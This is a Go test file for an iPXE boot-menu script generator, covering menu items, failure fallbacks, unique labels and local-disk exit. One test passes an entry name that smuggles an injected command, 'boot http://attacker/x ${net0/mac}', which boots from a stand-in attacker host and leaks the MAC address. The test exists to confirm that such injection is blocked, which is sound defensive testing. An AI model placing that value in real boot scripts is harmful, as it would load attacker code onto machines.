package menu

import (
	"strings"
	"testing"
)

func TestEveryEntryGetsAnItemAndASectionThatFailsToTheMessage(t *testing.T) {
	script := Script("Gola Bootlace", []Entry{
		{Name: "Ubuntu 24.04 Desktop", Commands: []string{"kernel http://s/k", "boot"}},
		{Name: "Windows 11", Commands: []string{"echo windows"}},
	})
	for _, want := range []string{
		"#!ipxe\n", "menu Gola Bootlace\n", "item e0-ubuntu-24-04-desktop Ubuntu 24.04 Desktop\n", "item e1-windows-11 Windows 11\n",
		":e0-ubuntu-24-04-desktop\nkernel http://s/k || goto failed\nboot || goto failed\ngoto failed\n",
		":failed\n", "choose --default ${menu-default} selected || goto shell\n", ":shell\nshell\n",
	} {
		if !strings.Contains(script, want) {
			t.Errorf("the script lacks %q:\n%s", want, script)
		}
	}
}

func TestAnEmptyFolderStillGivesAUsableMenu(t *testing.T) {
	script := Script("Gola Bootlace", nil)
	if !strings.Contains(script, "No ISO files were found") || !strings.Contains(script, "item shell") {
		t.Errorf("empty menu:\n%s", script)
	}
}

func TestStrangeNamesCannotInjectCommands(t *testing.T) {
	script := Script("t", []Entry{{Name: "evil\nboot http://attacker/x ${net0/mac}", Commands: []string{"echo ok"}}})
	for _, line := range strings.Split(script, "\n") {
		if strings.HasPrefix(line, "boot http://attacker") {
			t.Fatalf("a name started its own command line: %q", line)
		}
	}
	if strings.Contains(script, "${net0/mac}") && strings.Contains(strings.Split(script, "item e0")[1], "${net0") {
		t.Error("a name must not expand iPXE variables")
	}
}

func TestLabelsAreUniqueEvenForTheSameName(t *testing.T) {
	script := Script("t", []Entry{{Name: "Same"}, {Name: "Same"}})
	if strings.Count(script, ":e0-same\n") != 1 || strings.Count(script, ":e1-same\n") != 1 {
		t.Errorf("labels:\n%s", script)
	}
}

func TestTheMenuCanLeaveTheNetworkBootForTheOwnDisk(t *testing.T) {
	s := ScriptWith("Gola Bootlace", []Entry{{Name: "One", Commands: []string{"echo hi"}}}, Options{Default: -1, Timeout: 5})
	for _, want := range []string{"set menu-default local", "item local ", ":local\n", "\nexit\n", "--timeout 5000"} {
		if !strings.Contains(s, want) {
			t.Errorf("missing %q in\n%s", want, s)
		}
	}
	if strings.Contains(Script("x", nil), "set menu-default local") {
		t.Error("the own disk must not be the default unless asked for")
	}
}

func TestDirectAndLocalScriptsHaveNoMenu(t *testing.T) {
	d := Direct("Rule: this PC starts X", Entry{Name: "X", Commands: []string{"echo a", "boot"}}, "http://s/menu?page=1")
	if strings.Contains(d, "choose") || !strings.Contains(d, "echo a || goto failed\n") || !strings.Contains(d, ":failed") || !strings.HasPrefix(d, "#!ipxe\necho Rule: this PC starts X\n") {
		t.Fatal(d)
	}
	if l := Local("own disk"); l != "#!ipxe\necho own disk\nexit\n" {
		t.Fatal(l)
	}
}

func TestAFailedStartWaitsThenReturnsToTheMenuNotToTheDisk(t *testing.T) {
	back := "http://s/menu?page=1"
	for name, script := range map[string]string{
		"menu":   ScriptWith("x", []Entry{{Name: "A", Commands: []string{"boot"}}}, Options{Again: back}),
		"direct": Direct("Rule", Entry{Name: "A", Commands: []string{"boot"}}, back),
	} {
		for _, want := range []string{":failed\necho Booting did not work: read the message above.\nprompt --timeout 20000 ", " || echo\ngoto again\n", ":again\nchain " + back + " || goto shell\n"} {
			if !strings.Contains(script, want) {
				t.Errorf("%s: missing %q in\n%s", name, want, script)
			}
		}
		if strings.Contains(script, "${self}") {
			t.Errorf("%s: ${self} is not an iPXE setting", name)
		}
		// the only way to the PC's own disk is the explicit entry
		if strings.Count(script, "\nexit\n") > 1 {
			t.Errorf("%s: more than one way to the disk:\n%s", name, script)
		}
	}
	if s := Direct("Rule", Entry{Name: "A", Commands: []string{"boot"}}, ""); !strings.Contains(s, ":again\nshell\n") {
		t.Errorf("without an address the shell is the way out:\n%s", s)
	}
}
